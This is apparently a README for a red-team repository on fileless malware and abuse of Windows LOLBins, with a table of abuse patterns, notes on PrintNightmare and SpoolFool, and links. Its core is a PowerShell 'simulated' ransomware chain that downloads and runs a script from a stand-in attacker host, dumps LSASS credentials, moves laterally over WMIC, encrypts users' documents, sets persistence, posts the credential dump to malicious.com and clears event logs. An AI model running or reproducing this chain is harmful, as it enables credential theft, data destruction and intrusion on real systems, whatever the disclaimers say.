

# Overview

## ⚠️ Advisory Warning: Educational Use Only

This repository contains research material on advanced cybersecurity concepts, including NSFW (Not Safe for Work) topics such as **fileless malware**, **LOLBins abuse**, and **adversary simulation chains**.
All content is intended **solely for educational, academic, and controlled research lab environments**.

> **🚫 Do not deploy or reproduce any of the included techniques on unauthorized or production systems. Misuse may violate legal, ethical, and professional standards.**

![Screenshot 2025-05-21 001453](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)


---

## 🧠 Threat Landscape Overview: Fileless Malware & LOLBins

**Fileless malware** operates exclusively in memory, avoiding disk writes to evade antivirus and EDR solutions. Leveraging trusted system binaries, attackers can bypass defenses without dropping a traditional file-based payload. These attacks often chain together native tools, scripts, and in-memory injection, leaving minimal forensic traces.

**LOLBins** (Living Off the Land Binaries) are legitimate Windows binaries repurposed by adversaries for malicious activity. Since they’re signed and trusted, many defenses overlook them. Abuse of LOLBins is a common red team tactic mapped extensively in the [MITRE ATT\&CK](https://attack.mitre.org/) framework.

---

## ⚙️ Common LOLBins and Abuse Patterns

| LOLBin                     | Abused For                | ATT\&CK Tactics                   |
| -------------------------- | ------------------------- | --------------------------------- |
| `rundll32.exe`             | DLL execution             | Code execution, EDR bypass        |
| `mshta.exe`                | Run HTA payloads          | Script execution, sandbox evasion |
| `regsvr32.exe`             | Load COM DLLs             | Fileless execution, C2 proxy      |
| `wmic.exe`                 | Remote command execution  | Process launch, lateral movement  |
| `cmd.exe / powershell.exe` | Script runners            | Payload staging, persistence      |
| `msbuild.exe`              | Inline C# compile/exec    | Fileless malware loading          |
| `certutil.exe`             | Download/decode files     | Exfiltration, staging             |
| `bitsadmin.exe`            | Remote file fetch         | Delivery, task persistence        |
| `schtasks.exe`             | Task scheduling           | Privilege escalation, persistence |
| `esentutl.exe`             | Copy/exec binary payloads | Stealth operations, exfiltration  |

---

## 🧬 Simulated Kill Chain: 100% Fileless Ransomware

*Using [MITRE ATT\&CK](https://attack.mitre.org/) for Technique Mapping*

> ⚠️ **Disclaimer**: This PowerShell sequence is a synthetic simulation created for red team development in secure lab environments. Execution outside of controlled conditions is **strictly prohibited**.

<details>
<summary>🔐 Simulated PowerShell Ransomware Payload Chain</summary>

```powershell
# 🎯 Initial Access (T1190)
$payloadUrl = "http://malicious.com/dropper.ps1"
IEX(New-Object Net.WebClient).DownloadString($payloadUrl)

# ⚡ Execution (T1059.001)
$encPayload = "[Base64-Encoded Payload]"
$decodedPayload = [System.Convert]::FromBase64String($encPayload)
[System.Reflection.Assembly]::Load($decodedPayload)

# 🔓 Privilege Escalation (T1548)
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\elevate.ps1" -Verb RunAs

# 🧪 Credential Access (T1003.001)
Invoke-Expression "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full"

# 🔍 Discovery (T1082)
$sysInfo = Get-WmiObject Win32_ComputerSystem | Select Manufacturer, Model, Name, Domain, UserName
$networkInfo = Get-NetAdapter | Select Name, MacAddress, Status
Write-Output $sysInfo; Write-Output $networkInfo

# 🌐 Lateral Movement (T1021.001)
cmd.exe /c "wmic /node:targetPC process call create 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'"

# 💣 Impact: File Encryption (T1486)
$targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.docx,*.xls -Recurse
foreach ($file in $targetFiles) {
    $content = Get-Content $file.FullName -Raw
    $key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock($bytes, 0, $bytes.Length))
    Set-Content -Path $file.FullName -Value $encryptedContent
}

# 📌 Persistence (T1547.001)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousProcess" -Value "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1"
schtasks /create /tn "MaliciousTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" /sc onlogon /rl highest

# 📤 Exfiltration (T1041)
$exfilData = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp"))
Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfilData

# 🧹 Defense Evasion (T1070)
Remove-Item -Path C:\Windows\Temp\* -Force -Recurse
wevtutil cl System; wevtutil cl Security; wevtutil cl Application
cmd.exe /c "attrib +h +s C:\Windows\Temp\*"
```

</details>


### 🔓 **1. CVE-2021-34527 — "PrintNightmare"**

* **Name**: PrintNightmare
* **CVE**: [CVE-2021-34527](https://nvd.nist.gov/vuln/detail/CVE-2021-34527)
* **Type**: Remote Code Execution + Local Privilege Escalation
* **Vector**: Malicious printer driver install via SMB or RDP with Print Spooler enabled
* **Exploit Chain**: Gain RCE as SYSTEM remotely via crafted printer driver + DLL
* **Status**: Patched, but **many misconfigured systems remain vulnerable**
* **Best Use**: Initial Access + Lateral Movement (wormable)

---

### 🧬 **2. CVE-2022-21999 — "SpoolFool"**

* **Name**: SpoolFool
* **CVE**: [CVE-2022-21999](https://nvd.nist.gov/vuln/detail/CVE-2022-21999)
* **Type**: Local Privilege Escalation (to SYSTEM)
* **Vector**: Arbitrary file write via Print Spooler registry misconfiguration (`HKLM\SYSTEM\CurrentControlSet\Control\Print\Printers\*`)
* **Exploit Chain**: Inject malicious DLL via PrintNotify callback registry, then start spoolsv
* **Status**: Still viable against many targets, especially **Windows Home editions**
* **Best Use**: Post-RCE PrivEsc (e.g. after phishing, file drop, or PrintNightmare)

# TeamViewer as a RAT: Summary

TeamViewer, a popular remote desktop application, can be misused as a Remote Access Trojan (RAT) primarily by exploiting weak configurations, credential theft, or known vulnerabilities in its software versions. Attackers who gain access to valid credentials or exploit unpatched CVEs (such as DLL injection or privilege escalation flaws) can silently control a target system remotely, execute arbitrary commands, and move laterally within networks. This misuse leverages TeamViewer’s legitimate remote control capabilities to maintain persistent, stealthy access without triggering typical malware defenses. However, turning TeamViewer into a RAT requires either compromising authentication or exploiting vulnerabilities in older or unpatched versions, highlighting the importance of strong credential management and timely software patching.


## 🧭 Additional Red Team Resources

* 🛠️ [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
* 🧬 [LOLGEN – Generate LOLBin Abuse Chains](https://lolgen.hdks.org/)
* 🔍 [MITRE ATT\&CK Entry – S0697](https://attack.mitre.org/software/S0697/)
* 💥 [PrintNightmare Technical Dive](https://itm4n.github.io/printnightmare-not-over/)
* 💀 [Print Spooler Exploit Overview](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)
* 🔗 [DLL Injection Reference](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* 🦠 [Wikipedia: Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)
* 🖨️ [Printer Driver Exploit Repo](https://github.com/jacob-baines/concealed_position)

---

## 🛡️ Final Note

This repository is curated for cybersecurity researchers, malware analysts, and red team operators. It is not intended for malicious use or real-world deployment. Always adhere to your country’s cybercrime laws and organizational rules of engagement. Operate responsibly.

